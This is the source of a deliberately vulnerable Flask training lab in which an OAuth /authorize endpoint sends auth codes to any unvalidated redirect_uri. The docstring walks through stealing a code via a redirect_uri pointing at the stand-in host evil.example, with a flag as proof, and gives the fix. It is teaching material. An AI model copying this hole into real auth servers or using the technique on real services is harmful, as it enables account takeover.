"""
Lab 41 -- OAuth redirect_uri not validated (auth-code theft).

/authorize issues an auth code and 302-redirects to whatever redirect_uri
the client supplies, with no allow-list -- so an attacker who sends the
victim a link with redirect_uri=https://evil.example gets the victim's code
(and any token exchanged with it).

In Nullock:
    1. nullock scope add http://localhost:5041/*
    2. /authorize?client_id=app&redirect_uri=https://app.example/cb  (intended)
    3. Send to Repeater, set redirect_uri=https://evil.example/cb -- the 302
       Location carries ?code=... to evil.example. (The open-redirect probe
       also flags it: the resolved Location host leaves the origin.)
    4. Confirm success: GET /flag -- solved only once /authorize actually
       issued a code to a redirect_uri OUTSIDE the client's registered
       origin (https://app.example/), proving the auth-code theft, not just
       that the legitimate redirect was followed.

Fix: validate redirect_uri against the exact value(s) registered for the
client; never honor an arbitrary redirect_uri.
"""

from flask import Flask, request, redirect, jsonify
import hashlib
import secrets

app = Flask(__name__)
FLAG = "NULLOCK{%s}" % hashlib.sha256(b"lab-41-oauth-redirect-uri").hexdigest()[:16]
REGISTERED_ORIGIN = "https://app.example/"
CODE_STOLEN = {"done": False}


@app.route("/")
def index():
    return ('<a href="/authorize?client_id=app&redirect_uri=https://app.example/cb">'
            'login with OAuth</a>')


@app.route("/authorize")
def authorize():
    redirect_uri = request.args.get("redirect_uri", "")
    if not redirect_uri:
        return "redirect_uri required", 400
    code = secrets.token_urlsafe(12)
    if not redirect_uri.startswith(REGISTERED_ORIGIN):
        # VULN: an auth code just left for a redirect_uri the client never registered.
        CODE_STOLEN["done"] = True
    sep = "&" if "?" in redirect_uri else "?"
    # VULN: redirect to an unvalidated redirect_uri carrying the auth code.
    return redirect(redirect_uri + sep + "code=" + code)


@app.route("/flag")
def flag_route():
    if CODE_STOLEN["done"]:
        return jsonify(solved=True, flag=FLAG)
    return jsonify(solved=False), 403


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5041, debug=False)
